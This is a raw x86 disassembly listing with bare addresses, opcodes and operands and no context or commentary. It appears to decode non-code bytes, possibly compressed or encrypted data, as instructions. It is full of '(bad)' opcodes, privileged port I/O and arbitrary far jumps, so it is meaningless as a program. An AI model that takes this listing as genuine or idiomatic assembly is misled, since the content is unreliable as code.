  428f15:	stos   BYTE PTR es:[edi],al
  428f16:	lds    ecx,FWORD PTR [ebx]
  428f18:	(bad)  
  428f19:	and    DWORD PTR [esi],esp
  428f1b:	xor    al,0x6b
  428f1d:	inc    ecx
  428f1e:	sbb    DWORD PTR [edx+ebp*4],eax
  428f21:	mov    al,0x2
  428f23:	out    0xa2,eax
  428f25:	shl    BYTE PTR [esi+0x16],1
  428f28:	imul   esp,DWORD PTR [edi-0x7a],0x495d1a6b
  428f2f:	xchg   ebp,eax
  428f30:	dec    esp
  428f31:	pop    es
  428f32:	mov    dl,0x49
  428f34:	lods   al,BYTE PTR ds:[esi]
  428f35:	sub    eax,0xa05a0c7e
  428f3a:	imul   ecx,ebp,0x3d8f735
  428f40:	inc    ebp
  428f41:	mov    cs,WORD PTR [ecx-0x389fa444]
  428f47:	dec    edi
  428f48:	cmp    al,0x5e
  428f4a:	mov    al,ds:0x460871e0
  428f4f:	mov    cl,0xab
  428f51:	cmp    BYTE PTR ds:0x6e8c4f98,bl
  428f57:	test   cl,dh
  428f59:	xchg   ecx,eax
  428f5a:	xchg   edi,eax
  428f5b:	mov    gs:0x50a1448a,ax
  428f62:	pop    ecx
  428f63:	aad    0x1a
  428f65:	push   es
  428f66:	addr16 ja 0x428ef9
  428f69:	sti    
  428f6a:	loope  0x428fba
  428f6c:	outs   dx,BYTE PTR ds:[esi]
  428f6d:	lock mov al,ds:0xc63933d7
  428f73:	mov    ah,0xa0
  428f75:	clc    
  428f76:	push   es
  428f77:	and    DWORD PTR [edx],eax
  428f79:	mov    bh,0x29
  428f7b:	aas    
  428f7c:	cmovb  edi,edi
  428f7f:	bound  ebx,QWORD PTR [ecx-0x5225106]
  428f85:	test   al,0xeb
  428f87:	inc    ecx
  428f88:	mov    DWORD PTR [ebx],edi
  428f8a:	or     edi,DWORD PTR [eax]
  428f8c:	sbb    dl,BYTE PTR [edx+0x70]
  428f8f:	mov    BYTE PTR [eax+0x53],ah
  428f92:	cmp    dh,bh
  428f94:	fst    QWORD PTR [edx]
  428f96:	popa   
  428f97:	push   cs
  428f98:	pop    esi
  428f99:	add    esi,ecx
  428f9b:	in     eax,0xa9
  428f9d:	pop    edi
  428f9e:	jge    0x428f2d
  428fa0:	clc    
  428fa1:	jmp    0x5046:0x8c84e275
  428fa8:	cmp    BYTE PTR [eax],0x55
  428fab:	loop   0x428ff0
  428fad:	ror    DWORD PTR [edi-0x6],1
  428fb0:	sub    edx,DWORD PTR [esi+0x49]
  428fb3:	or     BYTE PTR [esi+0x3914d7ba],bl
  428fb9:	push   edx
  428fba:	mov    ebx,0x9a1c9b1f
  428fbf:	or     al,0x97
  428fc1:	mov    edx,0x8bc21f64
  428fc6:	shl    BYTE PTR [eax-0x14],cl
  428fc9:	shr    BYTE PTR [ecx],0x1a
  428fcc:	jl     0x429015
  428fce:	outs   dx,BYTE PTR ds:[esi]
  428fcf:	es lds edi,FWORD PTR gs:[eax+ebx*8-0x407e3742]
  428fd8:	inc    ebp
  428fd9:	fist   DWORD PTR [edx+0x75]
  428fdc:	fldcw  WORD PTR [esi+0x4fd7879c]
  428fe2:	rcr    DWORD PTR [esp+edi*2],1
  428fe5:	push   cs
  428fe6:	dec    ecx
  428fe7:	jmp    0xf2cb:0xa82221fc
  428fee:	(bad)  
  428fef:	sahf   
  428ff0:	sbb    ch,BYTE PTR [ebx]
  428ff2:	xchg   esi,eax
  428ff3:	or     al,0x74
  428ff5:	into   
  428ff6:	fidiv  WORD PTR [edx]
  428ff8:	out    0xa4,al
  428ffa:	imul   edi,DWORD PTR [edx-0xb],0xb97e8eda
  429001:	and    ebp,DWORD PTR [eax]
  429003:	dec    ebx
  429004:	xchg   DWORD PTR gs:0x80a4151b,edi
  42900b:	xchg   edi,eax
  42900c:	mov    esp,0xa1971543
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xb7fc7b77
  429081:	mov    eax,0xb741eedb
  429086:	add    DWORD PTR [eax],eax
  429088:	add    eax,0xd4000001
  42908d:	sbb    eax,0xde07523a
  429092:	shl    DWORD PTR [edi+edx*2],0x36
  429096:	cli    
  429097:	sbb    edx,DWORD PTR [edi]
  429099:	pushf  
  42909a:	addr16 (bad) 
  42909c:	sti    
  42909d:	cld    
  42909e:	sub    dh,BYTE PTR [ecx-0x69]
  4290a1:	mov    ebp,0xb34ab330
  4290a6:	push   cs
  4290a7:	mov    esi,0x7c669e06
  4290ac:	adc    BYTE PTR [esi-0x65366394],0x56
  4290b3:	idiv   edx
  4290b5:	repnz repz in eax,dx
  4290b8:	cmc    
  4290b9:	stos   BYTE PTR es:[edi],al
  4290ba:	out    dx,al
  4290bb:	shl    DWORD PTR [edi+eiz*2-0x18160448],0x4a
  4290c3:	fsubr  st(3),st
  4290c5:	jl     0x42904c
  4290c7:	xchg   esp,eax
  4290c8:	sbb    esp,DWORD PTR [ebx+0x6a6ada95]
  4290ce:	daa    
  4290cf:	pushf  
  4290d0:	mov    bh,0x18
  4290d2:	ss sub eax,0x8b408c1c
  4290d8:	(bad)  
  4290d9:	sub    ebp,DWORD PTR [edx]
  4290db:	mov    eax,0x4a401d42
  4290e0:	test   DWORD PTR ds:0x8e36247,edi
  4290e6:	mov    al,ds:0x31893c10
  4290eb:	mov    ds:0x41b44111,eax
  4290f0:	out    0x6d,eax
  4290f2:	test   eax,0xf567f2f4
  4290f7:	js     0x429107
  4290f9:	pushf  
  4290fa:	fsub   DWORD PTR ds:0xa94a4ed6
  429100:	xor    DWORD PTR [ecx+0x72],esp
  429103:	test   BYTE PTR [ecx-0x5a],dh
  429106:	mov    eax,0x510661c
  42910b:	and    DWORD PTR ds:0x4a93677e,esp
  429111:	mov    ds:0xc12d7237,al
  429116:	mov    eax,ds:0x655320ce
  42911b:	js     0x429181
  42911d:	cld    
  42911e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42911f:	mov    ecx,DWORD PTR gs:[ecx+0x51ceb764]
  429126:	xchg   esi,eax
  429127:	pop    es
  429128:	test   BYTE PTR [edx-0xe],0xb5
  42912c:	xchg   bl,al
  42912e:	leave  
  42912f:	cmp    esi,DWORD PTR [ebx+0x3039c1df]
  429135:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429136:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429137:	mov    cl,0xe6
  429139:	into   
  42913a:	xor    dl,ah
  42913c:	repz pop esp
  42913e:	fiadd  WORD PTR [ebp+0x55]
  429141:	shr    BYTE PTR [ecx-0x30],1
  429144:	mov    edx,0xb9f264c1
  429149:	and    dl,BYTE PTR [ebx+0x69]
  42914c:	out    dx,al
  42914d:	in     al,0x5c
  42914f:	ins    DWORD PTR es:[edi],dx
  429150:	cmc    
  429151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429152:	add    DWORD PTR [ebx+0x5a6f3d62],0xa62bcc88
  42915c:	jmp    0xeb12:0x947b235b
  429163:	jle    0x42918e
  429165:	ret    
  429166:	imul   ebx,eax,0x32
  429169:	scas   eax,DWORD PTR es:[edi]
  42916a:	fisub  WORD PTR [eax-0x1f471ead]
  429170:	dec    esp
  429171:	mov    cl,0xb9
  429173:	xor    BYTE PTR [edx],bl
  429175:	pop    ds
  429176:	push   edi
  429177:	outs   dx,DWORD PTR ds:[esi]
  429178:	jl     0x4291f8
  42917a:	adc    eax,0x2ff6b450
  42917f:	fcom   st(0)
  429181:	test   DWORD PTR cs:0xa1d1a855,ebx
  429188:	xchg   edi,eax
  429189:	and    BYTE PTR [eax+0x2cc6d3bf],dh
  42918f:	sti    
  429190:	imul   eax,DWORD PTR [eax],0x0
	...
  4291f2:	add    BYTE PTR [eax],al
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [esi+ecx*8+0x46c4a853],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ebx],al
  42920d:	es jb  0x4291ef
  429210:	pop    eax
  429211:	add    BYTE PTR [ebx],bh
  429213:	outs   dx,BYTE PTR ds:[esi]
  429214:	cmc    
  429215:	add    BYTE PTR [ecx],cl
  429217:	addr16 mov ebx,0x76b847a1
  42921d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42921e:	dec    ecx
  42921f:	in     eax,0x9
  429221:	dec    edi
  429222:	xchg   esi,eax
  429223:	iret   
  429224:	sub    ecx,ebp
  429226:	mov    al,ds:0xd9585d68
  42922b:	jmp    0xe315d3d9
  429230:	sub    al,0xa7
  429232:	shr    eax,1
  429234:	sub    BYTE PTR [edi*2+0x46efe1e8],ch
  42923b:	add    eax,0xcf73c5fc
  429240:	push   edx
  429241:	scas   al,BYTE PTR es:[edi]
  429242:	ja     0x4291f9
  429244:	std    
  429245:	cmp    eax,0x54ae7ada
  42924a:	sbb    DWORD PTR [eax+esi*2],ebx
  42924d:	fld    QWORD PTR [ebx+ecx*2]
  429250:	xchg   ebx,eax
  429251:	jecxz  0x42925d
  429253:	data16 (bad) 
  429255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429256:	dec    ecx
  429257:	push   eax
  429258:	jae    0x42927d
  42925a:	test   BYTE PTR [esi-0x3344be86],ch
  429260:	cwde   
  429261:	je     0x4291eb
  429263:	or     al,0x6
  429265:	lock sub ecx,DWORD PTR [edx-0x556683fa]
  42926c:	xchg   ebx,eax
  42926d:	test   eax,0x8e00568d
  429272:	in     eax,dx
  429273:	push   edx
  429274:	xor    DWORD PTR [edi],eax
  429276:	mov    dh,0xc9
  429278:	push   esi
  429279:	outs   dx,BYTE PTR ds:[esi]
  42927a:	out    dx,al
  42927b:	xchg   ebx,eax
  42927c:	sahf   
  42927d:	inc    edx
  42927e:	aas    
  42927f:	pop    edx
  429280:	sbb    al,0x7d
  429282:	aas    
  429283:	and    dl,BYTE PTR [esi+0x6c363c45]
  429289:	shl    DWORD PTR [esi-0xf],0x7a
  42928d:	mov    ecx,0x59dd1319
  429292:	push   es
  429293:	hlt    
  429294:	std    
  429295:	sti    
  429296:	push   esp
  429297:	test   eax,0xd56a3b5f
  42929c:	mov    DWORD PTR [ebx],esp
  42929e:	sub    ebp,DWORD PTR [eax+ebp*8-0x79b244ba]
  4292a5:	jmp    0xaaaa10af
  4292aa:	sbb    al,0x58
  4292ac:	or     eax,DWORD PTR [edx]
  4292ae:	adc    al,0x4c
  4292b0:	rcr    DWORD PTR [ebx-0x69],1
  4292b3:	clc    
  4292b4:	and    al,0x90
  4292b6:	pop    ecx
  4292b7:	cs pop esp
  4292b9:	test   BYTE PTR [esp+edi*8-0x664fc3d0],0x86
  4292c1:	dec    ebp
  4292c2:	pop    ss
  4292c3:	or     al,0x3a
  4292c5:	(bad)  
  4292c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292c7:	and    ebp,DWORD PTR [ebp-0x79]
  4292ca:	jbe    0x4292d6
  4292cc:	mov    ds:0x5202f228,eax
  4292d2:	and    esi,esp
  4292d4:	or     bh,bl
  4292d6:	pop    es
  4292d7:	add    ebp,DWORD PTR [ebp+0x35]
  4292da:	jns    0x4292de
  4292dc:	cmp    eax,0xba64e357
  4292e1:	xor    al,0x2e
  4292e3:	and    dh,BYTE PTR [ebx-0x69a91447]
  4292e9:	push   es
  4292ea:	dec    ecx
  4292eb:	mov    al,ds:0xbfc86473
  4292f0:	enter  0xd239,0xb3
  4292f4:	mov    ds:0x3ffd061e,eax
  4292f9:	jmp    0x5b37:0xb5fa3373
  429300:	mov    dl,0xbe
  429302:	mov    bl,0x50
  429304:	cmc    
  429305:	fdivp  st(7),st
  429307:	into   
  429308:	adc    eax,0x1b75dfcf
  42930d:	and    BYTE PTR [edi+0xc],0xcd
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x13
  429381:	pop    es
  429382:	dec    eax
  429383:	and    al,0x4b
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	sub    esi,DWORD PTR [esi+0x5aefa026]
  429392:	fcmovne st,st(1)
  429394:	mov    WORD PTR [esi+0x1ca69960],?
  42939a:	or     bh,BYTE PTR [edi]
  42939c:	daa    
  42939d:	jae    0x4293e5
  42939f:	xor    cl,dh
  4293a1:	jo     0x429369
  4293a3:	push   edi
  4293a4:	sub    BYTE PTR [esp+eiz*2+0x66ec2b0b],0x1f
  4293ac:	sbb    dh,ch
  4293ae:	fwait
  4293af:	lods   al,BYTE PTR ds:[esi]
  4293b0:	rcl    BYTE PTR [ebx+0x7e4dc3c4],1
  4293b6:	push   edx
  4293b7:	int    0x2e
  4293b9:	in     eax,dx
  4293ba:	inc    ecx
  4293bb:	mov    BYTE PTR [edi+0xe29140f],bl
  4293c1:	adc    DWORD PTR [edx+0x7306a40e],ebp
  4293c7:	inc    esp
  4293c8:	stos   DWORD PTR es:[edi],eax
  4293c9:	jno    0x42942d
  4293cb:	pop    ebx
  4293cc:	sbb    edi,edi
  4293ce:	cld    
  4293cf:	cmc    
  4293d0:	adc    bl,ch
  4293d2:	(bad)  
  4293d3:	sub    bh,BYTE PTR [edx+0x2f]
  4293d6:	int3   
  4293d7:	push   esi
  4293d8:	dec    ebp
  4293d9:	pop    ss
  4293da:	out    0x3c,eax
  4293dc:	adc    al,0x1c
  4293de:	popa   
  4293df:	retf   
  4293e0:	adc    DWORD PTR [ebp+esi*8-0x508af22f],ebx
  4293e7:	fwait
  4293e8:	and    eax,0x2501ba98
  4293ed:	enter  0xbaa4,0x10
  4293f1:	mov    esp,0x76f1de98
  4293f6:	sti    
  4293f7:	mov    ds:0x6cd85098,al
  4293fc:	retf   
  4293fd:	jmp    0x4293a6
  4293ff:	push   cs
  429400:	mov    al,ds:0xebc1463b
  429405:	push   ebp
  429406:	mov    al,ds:0x33607f8b
  42940b:	cs push esp
  42940d:	call   0x6145:0xb2bcfc70
  429414:	popa   
  429415:	lahf   
  429416:	dec    eax
  429417:	mov    cl,0xf6
  429419:	mov    eax,0x9214c26e
  42941e:	adc    ebx,edx
  429420:	addr16 push cs
  429422:	es pop ebp
  429424:	inc    esi
  429425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429426:	sti    
  429427:	sub    BYTE PTR [eax+0x40231c53],dl
  42942d:	jbe    0x429449
  42942f:	pop    ebx
  429430:	inc    edi
  429431:	or     WORD PTR [eax],cx
  429434:	das    
  429435:	cmp    dh,0xae
  429438:	and    eax,0x8c2f2334
  42943d:	js     0x4293f2
  42943f:	rcl    DWORD PTR [ecx+edx*4],cl
  429442:	rol    DWORD PTR [edx],cl
  429444:	add    eax,0xf75a9179
  429449:	inc    edi
  42944a:	mul    BYTE PTR [eax]
  42944c:	gs push edi
  42944e:	ss nop
  429450:	and    cl,BYTE PTR [edi-0x26]
  429453:	outs   dx,BYTE PTR ds:[esi]
  429454:	xchg   ebp,eax
  429455:	jo     0x4293eb
  429457:	push   cs
  429458:	sbb    edi,esp
  42945a:	cwde   
  42945b:	cmp    BYTE PTR [edx],bl
  42945d:	scas   al,BYTE PTR es:[edi]
  42945e:	das    
  42945f:	retf   0x870d
  429462:	es out 0xca,al
  429465:	and    dl,bl
  429467:	scas   eax,DWORD PTR es:[edi]
  429468:	dec    esp
  429469:	paddq  mm1,QWORD PTR [ecx-0x25fa2278]
  429470:	jmp    0x45045034
  429475:	lock faddp st(2),st
  429478:	inc    eax
  429479:	lock inc ebp
  42947b:	xor    cl,BYTE PTR [esi+0x7f]
  42947e:	repnz iret 
  429480:	sbb    eax,0xd7a90601
  429485:	mov    WORD PTR [edx-0x6d],?
  429488:	rcl    DWORD PTR [edx-0x56],1
  42948b:	mov    esi,0x81351c74
  429490:	adc    al,0x0
	...
  4294f2:	add    BYTE PTR [eax],al
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x40641cea],dx
  429503:	jge    0x429555
  429505:	mov    edx,0x1050001
  42950a:	add    BYTE PTR [eax],al
  42950c:	les    ebp,FWORD PTR [esi-0x34254cb0]
  429512:	bound  esi,QWORD PTR [ebx-0x7b]
  429515:	inc    edi
  429516:	dec    esi
  429517:	sbb    DWORD PTR ds:0xa9c050b9,esp
  42951d:	(bad)  [esi]
  42951f:	ins    DWORD PTR es:[edi],dx
  429520:	mov    esi,0x46c70a07
  429525:	sbb    edi,eax
  429527:	sub    eax,0xa6b632c1
  42952c:	in     eax,0x57
  42952e:	cmp    al,0xeb
  429530:	out    dx,al
  429531:	mov    ds:0xcddaf2ea,al
  429536:	jno    0x4295a8
  429538:	cmp    edi,DWORD PTR [bp+si+0x5f]
  42953c:	or     dl,bl
  42953e:	pop    ecx
  42953f:	loop   0x42956d
  429541:	(bad)  
  429542:	jmp    0x9215:0x199c193
  429549:	loopne 0x42950e
  42954b:	into   
  42954c:	cmp    edi,ecx
  42954e:	cdq    
  42954f:	or     al,0x93
  429551:	call   0xf76f:0x75c19b8a
  429558:	sahf   
  429559:	pop    ss
  42955a:	push   cs
  42955b:	dec    edx
  42955c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42955d:	jae    0x4294fb
  42955f:	popf   
  429560:	jne    0x4295ac
  429562:	aam    0x8e
  429564:	int    0xfc
  429566:	inc    ebp
  429567:	mov    bl,0xa9
  429569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42956a:	sbb    ebp,DWORD PTR [esi+0x5622f5]
  429570:	sbb    DWORD PTR [ecx+0x62178705],edx
  429576:	imul   edx,DWORD PTR [ebx],0x2c
  429579:	cmp    esi,esp
  42957b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42957c:	pop    ebp
  42957d:	push   edx
  42957e:	add    si,WORD PTR [ebx+eax*1-0x5e1f6654]
  429586:	or     ch,BYTE PTR [ebx-0x2b]
  429589:	mov    edi,0x29434832
  42958e:	pop    ecx
  42958f:	fwait
  429590:	mov    ds:0x520d6ec4,eax
  429595:	aas    
  429596:	sbb    eax,ebx
  429598:	out    dx,al
  429599:	mov    ebx,0x3cb97329
  42959e:	dec    edx
  42959f:	jns    0x42956b
  4295a1:	sbb    bh,BYTE PTR [esi-0x1545988a]
  4295a7:	mov    ds:0x6c5eae79,eax
  4295ac:	and    BYTE PTR [edx],ah
  4295ae:	push   0x42cb48b2
  4295b3:	pop    esi
  4295b4:	jmp    0xdf0144bd
  4295b9:	fwait
  4295ba:	jo     0x42960d
  4295bc:	shl    BYTE PTR [ecx-0x7c491ea4],0x8a
  4295c3:	jbe    0x4295b9
  4295c5:	xchg   ebx,eax
  4295c6:	les    edi,FWORD PTR [ebx+0x50f69f23]
  4295cc:	scas   eax,DWORD PTR es:[edi]
  4295cd:	(bad)  
  4295ce:	fdiv   DWORD PTR [ebp+eax*2-0x71]
  4295d2:	(bad)  
  4295d3:	jb     0x4295c8
  4295d5:	lods   al,BYTE PTR ds:[esi]
  4295d6:	or     DWORD PTR [eax],eax
  4295d8:	mov    ecx,0xd96bf036
  4295dd:	js     0x429591
  4295df:	cli    
  4295e0:	int    0x18
  4295e2:	mov    ?,WORD PTR [edx]
  4295e4:	or     eax,0xa4f7fb30
  4295e9:	xor    eax,0xcaf0064c
  4295ee:	xchg   esi,eax
  4295ef:	gs inc eax
  4295f1:	mov    bl,0x5f
  4295f3:	jne    0x42961a
  4295f5:	push   esi
  4295f7:	(bad)  [edx]
  4295f9:	imul   esp,DWORD PTR [edx],0xffffff9f
  4295fc:	sbb    cl,al
  4295fe:	cmp    dl,al
  429600:	or     ch,ah
  429602:	repnz loopne 0x42966f
  429605:	push   cs
  429606:	out    0x61,eax
  429608:	xor    dh,BYTE PTR [edx-0x28]
  42960b:	mov    ebp,0x6bcc4f6a
  429610:	ins    DWORD PTR es:[edi],dx
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	sub    BYTE PTR [edx+ecx*2+0x3f],ah
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	retf   0xa457
  42968f:	jg     0x42961f
  429691:	mov    DWORD PTR [edi+0x6d4b8eb6],ebx
  429697:	jnp    0x4296bd
  429699:	and    BYTE PTR [ebp-0x6],ch
  42969c:	cdq    
  42969d:	adc    al,0x4d
  42969f:	pop    eax
  4296a0:	in     eax,0xcc
  4296a2:	pop    ecx
  4296a3:	lods   eax,DWORD PTR ds:[esi]
  4296a4:	xor    al,0xcc
  4296a6:	mov    bh,0xcb
  4296a8:	jecxz  0x429721
  4296aa:	mov    ebp,0x8519f91
  4296af:	sbb    BYTE PTR [edx+0x47],bh
  4296b2:	xlat   BYTE PTR ds:[ebx]
  4296b3:	inc    ecx
  4296b4:	pop    ecx
  4296b5:	push   edx
  4296b6:	fisub  WORD PTR [edx-0x41d7f005]
  4296bc:	push   edi
  4296bd:	or     eax,0x5abafa2f
  4296c2:	cmp    bl,bh
  4296c4:	outs   dx,DWORD PTR ds:[esi]
  4296c5:	sub    bh,BYTE PTR [eax-0x2e2af45a]
  4296cb:	sub    ebp,ebx
  4296cd:	adc    ebx,DWORD PTR ds:0xea9c3e7f
  4296d3:	scas   eax,DWORD PTR es:[edi]
  4296d4:	jae    0x429718
  4296d6:	retf   
  4296d7:	adc    al,bh
  4296d9:	repnz pop ds
  4296db:	sub    eax,0x5bd7e2ed
  4296e0:	ret    0x416f
  4296e3:	pop    ebx
  4296e4:	outs   dx,BYTE PTR ds:[esi]
  4296e5:	mov    al,ds:0x7019b5c3
  4296ea:	sbb    BYTE PTR ds:0xc32da609,0x45
  4296f1:	mov    ebx,0x8a621c6
  4296f6:	outs   dx,BYTE PTR ds:[esi]
  4296f7:	cwde   
  4296f8:	jne    0x4296aa
  4296fa:	mov    ds:0xbdd0902c,al
  4296ff:	pusha  
  429700:	push   ss
  429701:	in     al,dx
  429702:	xor    cl,BYTE PTR [ebx+0x7f]
  429705:	sbb    eax,edi
  429707:	xor    BYTE PTR [esi],ch
  429709:	mov    WORD PTR [ebx-0x4e],cs
  42970c:	sbb    ch,BYTE PTR [eax-0x44ab06a5]
  429712:	and    al,0xcd
  429714:	mov    bh,0x43
  429716:	jmp    0x4155:0xe7b63993
  42971d:	(bad)  
  42971e:	aam    0xc3
  429720:	loope  0x429727
  429722:	or     dl,BYTE PTR [eax-0x73]
  429725:	test   eax,0x6235cbc2
  42972a:	sbb    ecx,DWORD PTR [ebp-0x3bc62ec5]
  429730:	rol    BYTE PTR [edx*4+0x6b658ed1],cl
  429737:	push   ecx
  429738:	daa    
  429739:	stos   DWORD PTR es:[edi],eax
  42973a:	in     eax,dx
  42973b:	dec    esi
  42973c:	les    ebp,FWORD PTR [ebp+0x4f]
  42973f:	push   es
  429740:	cmp    cl,BYTE PTR [ecx-0x7d]
  429743:	and    al,0x80
  429745:	ret    0xb471
  429748:	in     al,0xe7
  42974a:	test   DWORD PTR [edi],esp
  42974c:	cmp    cl,BYTE PTR [edi-0xab74506]
  429752:	jp     0x429775
  429754:	int    0xb4
  429756:	in     eax,0x26
  429758:	xchg   edx,eax
  429759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42975a:	stos   DWORD PTR es:[edi],eax
  42975b:	push   ecx
  42975c:	mov    edx,0x7f1e80b8
  429761:	sub    eax,0x2b076af6
  429766:	aas    
  429767:	not    DWORD PTR [edx]
  429769:	pop    ss
  42976a:	xchg   ebp,eax
  42976b:	adc    dh,bl
  42976d:	xchg   DWORD PTR [eax],edx
  42976f:	retf   
  429770:	sbb    bl,bh
  429772:	imul   esp,DWORD PTR [edi],0xffffffab
  429775:	sub    BYTE PTR [eax+eax*8],al
  429778:	fdiv   st(4),st
  42977a:	test   ecx,edx
  42977c:	arpl   WORD PTR [edi],dx
  42977e:	test   DWORD PTR [edx],esi
  429780:	outs   dx,BYTE PTR ds:[esi]
  429781:	call   0x208f:0x1e564fa4
  429788:	jp     0x4297b3
  42978a:	push   ds
  42978b:	in     eax,dx
  42978c:	add    esi,edi
  42978e:	or     DWORD PTR ds:0x5a,edi
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	xchg   edi,eax
  429801:	mov    ah,0x31
  429803:	call   0x105:0x1bc5a
  42980a:	add    BYTE PTR [eax],al
  42980c:	shl    BYTE PTR [ecx],1
  42980e:	and    bl,BYTE PTR [ecx]
  429810:	sub    edx,DWORD PTR [eax-0x34304f84]
  429816:	jmp    0x653d:0xfa074885
  42981d:	in     eax,0x3e
  42981f:	sbb    edx,edx
  429821:	das    
  429822:	add    bh,BYTE PTR [edx+eax*4]
  429825:	test   ah,ch
  429827:	mov    ebp,0x6d153c42
  42982c:	adc    al,0x18
  42982e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42982f:	inc    edi
  429830:	sub    eax,0x475a050
  429835:	cmp    eax,0xd22bb1d
  42983a:	push   eax
  42983b:	push   0xffffff80
  42983d:	imul   ebx,DWORD PTR ds:0x1f718ff7,0xffffffda
  429844:	sbb    DWORD PTR [ecx-0x51011df9],edx
  42984a:	pop    edi
  42984b:	or     BYTE PTR [edi+0x1f136c66],ch
  429851:	or     cl,BYTE PTR [esi]
  429853:	les    ebx,FWORD PTR [ecx]
  429855:	and    DWORD PTR [ebx],ebp
  429857:	sub    al,0x76
  429859:	sbb    BYTE PTR [esi+0x3d18de01],0x7e
  429860:	push   0x3800df79
  429865:	pop    esi
  429866:	ss ret 
  429868:	jo     0x42982c
  42986a:	push   0xffffff85
  42986c:	add    eax,0x2cab6a31
  429871:	mov    ebx,0xe75d0827
  429876:	or     edi,edx
  429878:	mov    esi,0xa5f97d0b
  42987d:	test   eax,esp
  42987f:	cmp    BYTE PTR [ecx-0x7e94b3bf],ah
  429885:	push   0x4f
  429887:	loope  0x429881
  429889:	aad    0xc7
  42988b:	cmp    bl,BYTE PTR [ebp+0x7a]
  42988e:	fcmovnbe st,st(6)
  429890:	pop    esp
  429891:	popa   
  429892:	jle    0x42981d
  429894:	jg     0x4298c8
  429896:	ja     0x429895
  429898:	je     0x42981e
  42989a:	or     edi,edi
  42989c:	loopne 0x4298ab
  42989e:	adc    BYTE PTR [ebp-0x71af0c6c],0x74
  4298a5:	in     eax,dx
  4298a6:	mov    WORD PTR [edx+ecx*2],?
  4298a9:	xchg   esi,eax
  4298aa:	test   al,0x88
  4298ac:	int    0x30
  4298ae:	fistp  QWORD PTR [edi-0x7f]
  4298b1:	push   ebx
  4298b2:	sbb    BYTE PTR [edx],bh
  4298b4:	fucomi st,st(5)
  4298b6:	dec    esi
  4298b7:	sbb    bh,BYTE PTR [esi]
  4298b9:	inc    esp
  4298ba:	mov    ecx,0xf1c02670
  4298bf:	pusha  
  4298c0:	mov    al,ds:0x1887fd5a
  4298c5:	sar    DWORD PTR [ecx+0x6d],cl
  4298c8:	out    dx,al
  4298c9:	addr16 into 
  4298cb:	jg     0x4298bf
  4298cd:	cmc    
  4298ce:	bound  eax,QWORD PTR [eax-0x1523e08c]
  4298d4:	jbe    0x4298db
  4298d6:	hlt    
  4298d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4298d8:	inc    ebp
  4298d9:	cli    
  4298da:	stos   DWORD PTR es:[edi],eax
  4298db:	fs push ecx
  4298dd:	cmc    
  4298de:	popa   
  4298df:	fld    QWORD PTR [di]
  4298e2:	stos   BYTE PTR es:[edi],al
  4298e3:	mov    edi,0x3cae8ba0
  4298e8:	ja     0x4298ef
  4298ea:	mov    ch,0x43
  4298ec:	mov    ds:0x1e3d6534,al
  4298f1:	jmp    0x6786:0x4f68bcc4
  4298f8:	ins    DWORD PTR es:[edi],dx
  4298f9:	mov    edx,0xf08a0d60
  4298fe:	lds    esi,FWORD PTR [edx+0x2a]
  429901:	repnz loope 0x4298cb
  429904:	(bad)  
  429906:	and    DWORD PTR ds:0x29e97b74,ebp
  42990c:	push   ecx
  42990d:	xchg   ecx,eax
  42990e:	retf   0x5b79
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	cs inc ebp
  429982:	dec    edx
  429983:	inc    ecx
  429984:	pop    edi
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	adc    bl,BYTE PTR [edx]
  42998e:	and    bh,BYTE PTR [ecx-0x11]
  429991:	add    al,0xe5
  429993:	xor    DWORD PTR [eax],0x3d
  429996:	stos   DWORD PTR es:[edi],eax
  429997:	jmp    0x4e68:0xc015212b
  42999e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42999f:	pop    edi
  4299a0:	repz aam 0xcb
  4299a3:	enter  0x87a,0x99
  4299a7:	(bad)  
  4299a8:	mov    bl,bh
  4299aa:	adc    al,0x10
  4299ac:	pushf  
  4299ad:	mov    eax,ds:0xc785e324
